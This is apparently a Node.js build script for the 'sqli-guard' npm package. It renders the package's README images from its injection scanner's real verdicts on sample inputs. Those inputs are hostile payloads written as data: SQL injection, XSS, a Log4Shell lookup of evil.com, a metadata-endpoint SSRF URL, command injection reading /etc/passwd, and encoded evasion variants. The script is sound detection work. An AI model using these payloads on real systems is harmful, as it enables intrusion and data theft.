'use strict';

// Generates the README images in ./assets from REAL scanner output,
// so the examples shown on npm can never drift from actual behavior.
//   node scripts/build-assets.js

const fs = require('node:fs');
const path = require('node:path');
const guard = require('../index');
const pkg = require('../package.json');

const out = (name, svg) => fs.writeFileSync(path.join(__dirname, '..', 'assets', name), svg);
const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
const FONT = "ui-monospace,SFMono-Regular,Menlo,Consolas,monospace";
const SANS = "-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif";
const C = { bg: '#0d1117', card: '#161b22', line: '#30363d', text: '#e6edf3', mute: '#8b949e', green: '#3fb950', red: '#f85149', amber: '#d29922', blue: '#58a6ff', purple: '#bc8cff' };

// ---------- banner ----------
out('banner.svg', `<svg xmlns="http://www.w3.org/2000/svg" width="900" height="260" viewBox="0 0 900 260" role="img" aria-label="sqli-guard: catch injection attacks before they reach your app">
<defs>
<linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#0d1117"/><stop offset="1" stop-color="#14233a"/></linearGradient>
<linearGradient id="a" x1="0" y1="0" x2="1" y2="0"><stop offset="0" stop-color="#3fb950"/><stop offset="1" stop-color="#58a6ff"/></linearGradient>
</defs>
<rect width="900" height="260" rx="16" fill="url(#g)"/>
<g opacity=".08" stroke="#58a6ff">${Array.from({ length: 15 }, (_, i) => `<path d="M${i * 60} 0V260"/>`).join('')}${Array.from({ length: 5 }, (_, i) => `<path d="M0 ${i * 60}H900"/>`).join('')}</g>
<g transform="translate(70 62)">
<path d="M60 0 120 22v52c0 40-26 68-60 84C26 142 0 114 0 74V22z" fill="#161b22" stroke="url(#a)" stroke-width="5"/>
<path d="M38 74l16 17 32-36" fill="none" stroke="#3fb950" stroke-width="10" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<text x="230" y="112" font-family="${SANS}" font-size="64" font-weight="800" fill="${C.text}">sqli-<tspan fill="url(#a)">guard</tspan></text>
<text x="232" y="154" font-family="${SANS}" font-size="22" fill="${C.mute}">Catch injection attacks before they reach your app.</text>
<g font-family="${SANS}" font-size="14" font-weight="600">
<rect x="232" y="182" width="150" height="30" rx="15" fill="#3fb95022" stroke="#3fb950"/><text x="307" y="202" text-anchor="middle" fill="#3fb950">0 dependencies</text>
<rect x="394" y="182" width="150" height="30" rx="15" fill="#58a6ff22" stroke="#58a6ff"/><text x="469" y="202" text-anchor="middle" fill="#58a6ff">${guard.detectors.length} attack families</text>
<rect x="556" y="182" width="150" height="30" rx="15" fill="#bc8cff22" stroke="#bc8cff"/><text x="631" y="202" text-anchor="middle" fill="#bc8cff">TypeScript ready</text>
<rect x="718" y="182" width="120" height="30" rx="15" fill="#d2992222" stroke="#d29922"/><text x="778" y="202" text-anchor="middle" fill="#d29922">v${pkg.version}</text>
</g>
</svg>`);

// ---------- terminal demo (real output) ----------
const demos = [
  "' OR 1=1 --",
  '<img src=x onerror=alert(1)>',
  '%27%20UN/**/ION%20SELECT%20password%20FROM%20users',
  '${jndi:ldap://evil.com/a}',
  'http://169.254.169.254/latest/meta-data/',
  '{"__proto__":{"isAdmin":true}}',
  'Hello, my name is Ana',
];
const rows = demos.map((d) => ({ d, r: guard.scan(d) }));
const rowH = 56;
const H = 120 + rows.length * rowH;
let y = 104;
const lines = rows.map(({ d, r }) => {
  const types = r.threats.map((t) => t.type).slice(0, 2);
  const ev = r.threats.some((t) => t.evasion);
  const col = r.safe ? C.green : C.red;
  const svg = `<text x="36" y="${y}" font-family="${FONT}" font-size="15" fill="${C.mute}">&gt;</text>
<text x="56" y="${y}" font-family="${FONT}" font-size="15" fill="${C.text}">${esc(d.length > 58 ? d.slice(0, 57) + '…' : d)}</text>
<rect x="56" y="${y + 10}" width="${r.safe ? 78 : 66}" height="22" rx="5" fill="${col}22" stroke="${col}"/>
<text x="${56 + (r.safe ? 39 : 33)}" y="${y + 26}" text-anchor="middle" font-family="${FONT}" font-size="13" font-weight="700" fill="${col}">${r.safe ? '✔ SAFE' : '✖ BLOCKED'}</text>
<text x="${r.safe ? 148 : 136}" y="${y + 26}" font-family="${FONT}" font-size="13" fill="${C.amber}">${esc(types.join(' · '))}${ev ? `<tspan fill="${C.purple}">  ⚑ decoded evasion</tspan>` : ''}</text>`;
  y += rowH;
  return svg;
}).join('\n');
out('demo.svg', `<svg xmlns="http://www.w3.org/2000/svg" width="900" height="${H}" viewBox="0 0 900 ${H}" role="img" aria-label="sqli-guard scanning malicious and safe inputs">
<rect width="900" height="${H}" rx="12" fill="${C.bg}" stroke="${C.line}"/>
<rect width="900" height="44" rx="12" fill="${C.card}"/><rect y="30" width="900" height="14" fill="${C.card}"/>
<circle cx="26" cy="22" r="6" fill="#ff5f56"/><circle cx="48" cy="22" r="6" fill="#ffbd2e"/><circle cx="70" cy="22" r="6" fill="#27c93f"/>
<text x="450" y="27" text-anchor="middle" font-family="${FONT}" font-size="13" fill="${C.mute}">node — sqliGuard.scan()</text>
<text x="36" y="76" font-family="${FONT}" font-size="14" fill="${C.blue}">const sqliGuard = require('sqli-guard');</text>
${lines}
</svg>`);

// ---------- coverage grid ----------
const meta = {
  'sql-injection': ['SQL Injection', "' OR 1=1 --", 'A03'],
  'xss': ['XSS', '<script>…', 'A03'],
  'command-injection': ['Command Injection', '; cat /etc/passwd', 'A03'],
  'path-traversal': ['Path Traversal', '../../etc/passwd', 'A01'],
  'nosql-injection': ['NoSQL Injection', '{"$ne": null}', 'A03'],
  'ldap-injection': ['LDAP Injection', '*)(uid=*))(|(uid=*', 'A03'],
  'template-injection': ['SSTI', '{{7*7}}', 'A03'],
  'crlf-injection': ['CRLF / Header', '%0d%0aSet-Cookie:', 'A03'],
  'ssrf': ['SSRF', '169.254.169.254', 'A10'],
  'xxe': ['XXE', '<!ENTITY … SYSTEM', 'A05'],
  'prototype-pollution': ['Prototype Pollution', '__proto__', 'A08'],
  'log4shell': ['Log4Shell / JNDI', '${jndi:ldap://…}', 'A06'],
  'xpath-injection': ['XPath Injection', "//*[name()='x']", 'A03'],
  'unicode-evasion': ['Unicode Evasion', 'null byte · bidi', 'A03'],
};
const isNew = new Set(['ssrf', 'xxe', 'prototype-pollution', 'log4shell', 'xpath-injection', 'unicode-evasion']);
const cols = 3, cw = 276, ch = 92, gap = 14;
const types = guard.detectors.map((d) => d.type);
const rowsN = Math.ceil(types.length / cols);
const GH = 90 + rowsN * (ch + gap);
const cells = types.map((t, i) => {
  const [name, ex, owasp] = meta[t] || [t, '', ''];
  const x = 24 + (i % cols) * (cw + gap), yy = 78 + Math.floor(i / cols) * (ch + gap);
  const sev = guard.detectors[i].severity;
  const sc = sev === 'high' ? C.red : C.amber;
  return `<g transform="translate(${x} ${yy})"><rect width="${cw}" height="${ch}" rx="10" fill="${C.card}" stroke="${isNew.has(t) ? C.green : C.line}"/>
<text x="16" y="30" font-family="${SANS}" font-size="16" font-weight="700" fill="${C.text}">${esc(name)}</text>
${isNew.has(t) ? `<rect x="${cw - 58}" y="14" width="42" height="18" rx="9" fill="${C.green}"/><text x="${cw - 37}" y="27" text-anchor="middle" font-family="${SANS}" font-size="11" font-weight="800" fill="#04260f">NEW</text>` : ''}
<text x="16" y="56" font-family="${FONT}" font-size="13" fill="${C.blue}">${esc(ex)}</text>
<circle cx="20" cy="76" r="4" fill="${sc}"/><text x="30" y="80" font-family="${SANS}" font-size="12" fill="${C.mute}">${sev} severity · OWASP ${owasp}</text></g>`;
}).join('\n');
out('coverage.svg', `<svg xmlns="http://www.w3.org/2000/svg" width="900" height="${GH}" viewBox="0 0 900 ${GH}" role="img" aria-label="Attack families detected by sqli-guard">
<rect width="900" height="${GH}" rx="12" fill="${C.bg}" stroke="${C.line}"/>
<text x="24" y="42" font-family="${SANS}" font-size="22" font-weight="800" fill="${C.text}">${types.length} attack families, one call</text>
<text x="24" y="62" font-family="${SANS}" font-size="13" fill="${C.mute}">Green outline = added in v1.1</text>
${cells}
</svg>`);

// ---------- evasion before/after ----------
const ev = [
  ['%27%20OR%201%3D1--', "URL-encoded"],
  ['%2527%2520OR%25201%253D1--', 'double-encoded'],
  ['1 UN/**/ION SEL/**/ECT a FROM t', 'inline comments'],
  ['ＳＥＬＥＣＴ * ＦＲＯＭ users', 'fullwidth Unicode'],
  ['&#106;avascript&#58;&#97;lert&#40;1&#41;', 'HTML entities'],
  ['%24%7Bjndi%3Aldap%3A%2F%2Fx%2Fa%7D', 'encoded Log4Shell'],
];
const EH = 100 + ev.length * 44;
let ey = 112;
const evRows = ev.map(([p, label]) => {
  const raw = guard.createScanner({ decode: false }).isSafe(p);
  const dec = guard.scan(p).safe;
  const r = `<text x="24" y="${ey}" font-family="${FONT}" font-size="14" fill="${C.text}">${esc(p)}</text>
<text x="470" y="${ey}" font-family="${SANS}" font-size="13" fill="${C.mute}">${label}</text>
<text x="620" y="${ey}" font-family="${FONT}" font-size="13" font-weight="700" fill="${raw ? C.red : C.green}">${raw ? '✖ missed' : '✔ caught'}</text>
<text x="770" y="${ey}" font-family="${FONT}" font-size="13" font-weight="700" fill="${dec ? C.red : C.green}">${dec ? '✖ missed' : '✔ caught'}</text>`;
  ey += 44;
  return r;
}).join('\n');
out('evasion.svg', `<svg xmlns="http://www.w3.org/2000/svg" width="900" height="${EH}" viewBox="0 0 900 ${EH}" role="img" aria-label="Evasion techniques caught by decoding">
<rect width="900" height="${EH}" rx="12" fill="${C.bg}" stroke="${C.line}"/>
<text x="24" y="40" font-family="${SANS}" font-size="22" font-weight="800" fill="${C.text}">Attackers encode. sqli-guard decodes.</text>
<text x="620" y="82" font-family="${SANS}" font-size="12" font-weight="700" fill="${C.mute}">without decoding</text>
<text x="770" y="82" font-family="${SANS}" font-size="12" font-weight="700" fill="${C.green}">sqli-guard</text>
<path d="M24 92H876" stroke="${C.line}"/>
${evRows}
</svg>`);
console.log('assets written');
